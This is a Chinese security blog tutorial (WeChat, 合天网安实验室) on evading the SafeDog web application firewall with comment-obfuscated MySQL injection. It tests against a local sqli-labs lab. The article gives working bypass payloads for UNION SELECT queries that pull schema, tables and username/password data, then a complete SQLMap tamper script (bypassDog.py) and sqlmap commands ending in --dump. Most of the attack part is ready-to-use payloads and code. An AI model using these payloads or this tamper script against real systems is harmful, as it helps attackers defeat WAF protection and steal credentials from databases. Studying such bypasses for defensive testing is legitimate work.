#  手把手教你编写SQLMap的Tamper脚本过狗

原创 tto  [ 合天网安实验室 ](javascript:void\(0\);)

**合天网安实验室** ![]()

微信号 hee_tian

功能介绍 为广大信息安全爱好者提供有价值的文章推送服务！

____

___发表于_

收录于合集

https://xz.aliyun.com/t/11412

[sql注入bypass最新版某狗
(qq.com)](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247495616&idx=1&sn=6a40395292bab8c2cdf4fd77ed701201&scene=21#wechat_redirect
"sql注入bypass最新版某狗 \(qq.com\)")

奇安信攻防社区-记一次实战过狗注入 (butian.net)

https://www.freebuf.com/sectool/179035.html

 **本文仅用于技术讨论与学习**  

## 测试环境

最新版某狗

![](https://gitee.com/fuli009/images/raw/master/public/20230222180140.png)![](https://gitee.com/fuli009/images/raw/master/public/20230222180142.png)![](https://gitee.com/fuli009/images/raw/master/public/20230222180143.png)

## 测试方法

 **安全狗其实是比较好绕的WAF，绕过方法很多，但这里我们就用一种：注释混淆**

一招鲜吃遍天

注释混淆，其实就是在敏感位置添加垃圾字符注释，常用的垃圾字符有`/、!、*、%`等

这里再解释一下 **内联注释** ，因为后面要用到：

MySQL内联注释： `/*!xxxxxxx*/` !后面的语句会当作SQL语句直接执行

但是如果`!`后面跟着MySQL版本号，那么就会出现两种情况

  * • 当`!`后面接的数据库版本号小于自身版本号，就会将注释中的内容执行

  * • 当`!`后面接的数据库版本号大于等于自身版本号，就会当做注释来处理。

数据库版本号以五位数字表示，比如当前环境下数据库版本号表示为：50553

![](https://gitee.com/fuli009/images/raw/master/public/20230222180144.png)

`!`后面接小于50553的：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180145.png)

执行了`select 1;`

`!`后面接大于等于50553的：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180146.png)

执行了 `select ;`

下面进入正题

## bypass

### and

`and 1=1`拦

![](https://gitee.com/fuli009/images/raw/master/public/20230222180147.png)

但是把空格删掉就不拦了

![](https://gitee.com/fuli009/images/raw/master/public/20230222180148.png)

所以，我们认为，and后面不能直接跟空格...

那么如果用其他形式表示空格呢？

前面说了，我们这次只使用注释混淆：

burp，抓包设置

![](https://gitee.com/fuli009/images/raw/master/public/20230222180150.png)![](https://gitee.com/fuli009/images/raw/master/public/20230222180151.png)

长度5335是被拦截的

![](https://gitee.com/fuli009/images/raw/master/public/20230222180152.png)

长度为899的说明成功绕过

![](https://gitee.com/fuli009/images/raw/master/public/20230222180153.png)

我们选择其中一个作为空格的替代者就好了，这里我们选择`/*%*`

即：` `->`/*/*%**/`

同理 ，`or`是一样的：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180155.png)

### order by

![](https://gitee.com/fuli009/images/raw/master/public/20230222180156.png)

测试发现还是只要替换`order by`中间的空格就可以了，所以绕过方法和前面一样：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180158.png)

### union select

![](https://gitee.com/fuli009/images/raw/master/public/20230222180201.png)

`union select`使用之前的垃圾字符替换空格发现不行了：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180203.png)

但是先不急于换方法，再爆破一遍试试：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180204.png)image-20221117231524071![](https://gitee.com/fuli009/images/raw/master/public/20230222180206.png)

发现又有很多可以绕过的了。

所以我们再更改一下替换空格的垃圾字符， 这里选`/*/!%!/*/`

即：` `->`/*/!%!/*/`

![](https://gitee.com/fuli009/images/raw/master/public/20230222180208.png)

### 获得当前数据库

正常语句：

    
    
    ?id=-1 union select 1,database(),3 --+

![](https://gitee.com/fuli009/images/raw/master/public/20230222180213.png)

绕过：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180214.png)

即：`()`->`(/*/!%!/*/)`

### 获取数据库中的表

正常语句：

    
    
    ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

![](https://gitee.com/fuli009/images/raw/master/public/20230222180215.png)image-20221117234536391

绕过：

经过测试发现拦截的是`select + from + information_schema`的组合

![](https://gitee.com/fuli009/images/raw/master/public/20230222180217.png)![](https://gitee.com/fuli009/images/raw/master/public/20230222180218.png)

中间加垃圾字符替换空格已经不管用了，我们尝试对关键字进行混淆。

对`information_schema`进行混淆测试：

首先使用内联注释，发现，这里的版本号不管写啥，都直接被拦。

![](https://gitee.com/fuli009/images/raw/master/public/20230222180219.png)

考虑是检测了`select + from + /*! + information_schema`的组合

加个换行试试

![](https://gitee.com/fuli009/images/raw/master/public/20230222180221.png)

还是不行...

那既然都换行了，那我们再在换行前加一些垃圾字符：

> 如果我们直接插入垃圾字符，会当作SQL语句执行，所以前面还需要在垃圾字符前加个注释，可以是 `/**/`或`#`或`--+`
>
> 但是经过测试只有 `--+`好用

![](https://gitee.com/fuli009/images/raw/master/public/20230222180222.png)

有这么多可以绕过的，我们随便选择一个，比如`/*%/`

这样，最终语句如下：

    
    
    ?id=-1/*/!%!/*/union/*/!%!/*/select/*/!%!/*/1,group_concat(table_name),3/*/!%!/*/from/*/!%!/*//*!00000--+/*%/%0ainformation_schema.tables*/%20where%20table_schema=database(/*/!%!/*/)--%20+

![](https://gitee.com/fuli009/images/raw/master/public/20230222180225.png)![](https://gitee.com/fuli009/images/raw/master/public/20230222180227.png)

### 获取表字段

正常语句：

    
    
    ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

绕过语句：

    
    
    ?id=-1/*/!%!/*/union/*/!%!/*/select/*/!%!/*/1,group_concat(column_name),3/*/!%!/*/from/*/!%!/*//*!00000--+/*%/%0ainformation_schema.columns*/%20where%20table_name=0x7573657273--%20+

![](https://gitee.com/fuli009/images/raw/master/public/20230222180228.png)

### 获取字段信息

    
    
    ?id=-1/*/!%!/*/union/*/!%!/*/select/*/!%!/*/1,/*/!%!/*/group_concat(username,0x2f,password),3/*/!%!/*/from/*/!%!/*/users

![](https://gitee.com/fuli009/images/raw/master/public/20230222180229.png)

成功。

## 编写tamper

当我们下载了SQLMap，解压后，我们可以找到文件夹【tamper】，该文件夹有很多个Tamper脚本帮助我们绕过一些安全防护：

![](https://gitee.com/fuli009/images/raw/master/public/20230222180231.png)

网上有很多相关脚本的介绍，我就不一一介绍了。

虽然SQLMap提供了这么多的Tamper脚本，但是在实际使用的过程中，网站的安全防护并没有那么简单，可能过滤了许多敏感的字符以及相关的函数。这个时候就需要我们针对目标的防护体系构建相应的Tamper脚本。

Tamper相当于一个加工车间，它会把我们的Payload进行加工之后发往目标网站。

我们随便打开一个Tamper脚本看一下它的结构：

    
    
    #apostrophemask.py  
      
    #!/usr/bin/env python  
      
    """  
    Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)  
    See the file 'LICENSE' for copying permission  
    """  
    # 导入SQLMap中lib\core\enums中的PRIORITY优先级函数  
    from lib.core.enums import PRIORITY  
    # 定义脚本优先级  
    __priority__ = PRIORITY.LOWEST  
      
    # 对当前脚本的介绍  
    def dependencies():  
        pass  
      
    '''  
    对传进来的payload进行修改并返回  
    函数有两个参数。主要更改的是payload参数，kwargs参数用得不多。  
    '''  
    def tamper(payload, **kwargs):  
        """  
        Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)  
      
        References:  
            * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128  
            * https://web.archive.org/web/20130614183121/http://lukasz.pilorz.net/testy/unicode_conversion/  
            * https://web.archive.org/web/20131121094431/sla.ckers.org/forum/read.php?13,11562,11850  
            * https://web.archive.org/web/20070624194958/http://lukasz.pilorz.net/testy/full_width_utf/index.phps  
      
        >>> tamper("1 AND '1'='1")  
        '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'  
        """  
      
        return payload.replace('\'', "%EF%BC%87") if payload else payload  
    

可见Tamper脚本的结构非常简单，其实渗透测试中的主要难点还是如何去绕过WAF。

下面我们针对bypass部分的绕过方法进行编写Tamper脚本，来实现自动化SQL注入：

> 实际测试的时候发现，sqlmap默认语句中的`AS`关键字也会被拦截，这里也用同样的方法替换一下就好
    
    
    #!/usr/bin/env python  
      
    import re  
      
    from lib.core.settings import UNICODE_ENCODING  
    from lib.core.enums import PRIORITY  
    __priority__ = PRIORITY.NORMAL  
      
    def dependencies():  
        pass  
      
    def tamper(payload, **kwargs):  
        if payload:  
            payload = payload.replace(" ","/*/!%!/*/")  
            payload = payload.replace("()","(/*/!%!/*/)")  
            payload = re.sub(r"(?i)(INFORMATION_SCHEMA.SCHEMATA)",r"/*!00000--%20/*%/%0aINFORMATION_SCHEMA.SCHEMATA*/",payload)  
            payload = re.sub(r"(?i)(INFORMATION_SCHEMA.TABLES)",r"/*!00000--%20/*%/%0aINFORMATION_SCHEMA.TABLES*/",payload)  
            payload = re.sub(r"(?i)(INFORMATION_SCHEMA.COLUMNS)",r"/*!00000--%20/*%/%0aINFORMATION_SCHEMA.COLUMNS*/",payload)  
            payload = re.sub(r"(?i)(/AS/)",r"//*!00000--%20/*%/%0aAS*//",payload)          
      
        return payload  
    

测试：

    
    
    sqlmap.py -u "http://192.168.13.131/sqli-labs/Less-2/?id=1" --tamper "bypassDog.py" --proxy "http://127.0.0.1:8080/" --fresh-queries --random-agent

![](https://gitee.com/fuli009/images/raw/master/public/20230222180232.png)

    
    
    sqlmap.py -u "http://192.168.13.131/sqli-labs/Less-2/?id=1" --tamper "bypassDog.py" --proxy "http://127.0.0.1:8080/" --fresh-queries --random-agent --dbs
    
    
    sqlmap.py -u "http://192.168.13.131/sqli-labs/Less-2/?id=1" --tamper "bypassDog.py" --proxy "http://127.0.0.1:8080/" --fresh-queries --random-agent -D security --tables

![](https://gitee.com/fuli009/images/raw/master/public/20230222180235.png)

    
    
    python2 sqlmap.py -u "http://192.168.13.131/sqli-labs/Less-2/?id=1" --tamper "bypassDog.py" --proxy "http://127.0.0.1:8080/" --fresh-queries --random-agent -D security -T users --columns

![](https://gitee.com/fuli009/images/raw/master/public/20230222180237.png)

    
    
    sqlmap.py -u "http://192.168.13.131/sqli-labs/Less-2/?id=1" --tamper "bypassDog.py" --proxy "http://127.0.0.1:8080/" --fresh-queries --random-agent -D security -T users -C username,password --dump --stop 3

![](https://gitee.com/fuli009/images/raw/master/public/20230222180239.png)  

![](https://gitee.com/fuli009/images/raw/master/public/20230222180241.png)  

![](https://gitee.com/fuli009/images/raw/master/public/20230222180246.png)

征集原创技术文章中，欢迎投递

投稿邮箱：edu@antvsion.com

文章类型：黑客极客技术、信息安全、热点安全研究分析等安全相关

通过审核并发布能收获200-800不等的稿酬

  

[更多详情介绍，点我查看](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652885477&idx=1&sn=39e97a60d7b68d19569284654e74ffa1&chksm=bd59ad288a2e243e4d89b7c456fbd44a93d241c881075b342af22431d93dca56e52076ed75ce&scene=21#wechat_redirect)  

![](https://gitee.com/fuli009/images/raw/master/public/20230222180247.png)![]()![](https://gitee.com/fuli009/images/raw/master/public/20230222180248.png)免费靶场实操，戳“阅读原文“

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

